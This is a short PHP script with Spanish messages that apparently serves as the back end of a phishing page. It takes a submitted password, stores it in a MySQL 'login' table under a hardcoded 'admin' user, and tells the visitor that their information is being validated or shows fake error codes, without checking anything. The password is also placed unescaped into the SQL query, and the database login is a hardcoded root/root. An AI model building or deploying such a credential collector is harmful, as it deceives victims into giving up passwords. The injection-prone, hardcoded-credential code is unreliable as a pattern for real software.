<?php

    if(!empty($_POST["boton"])){
        if (empty($_POST["password"])){
            echo "Ocurrio un Error, vuelva a cargar la pagina. 404";
        }
        else {
            $pass = $_POST['password'];
            $user = 'admin';
            $conn = mysqli_connect('localhost', 'root', 'root', 'test');
            if (!$conn){
                #die("FALLO" . mysqli_connect_error());
                echo "Ocurrio un Error, vuelva a cargar la pagina. #02203bd ";

            }
            else {
                $sql = "INSERT INTO login (usuario, password) VALUES ('$user', '$pass')";
                if (mysqli_query($conn, $sql)) {
                    echo "Validando informacion, por favor espere un momento...";
                } else {
                        #echo "Error: " . $sql . "<br>" . mysqli_error($conn);
                        echo "Ocurrio un Error, vuelva a cargar la pagina. #02203tb ";

                }
                
            }
        }
    }
?>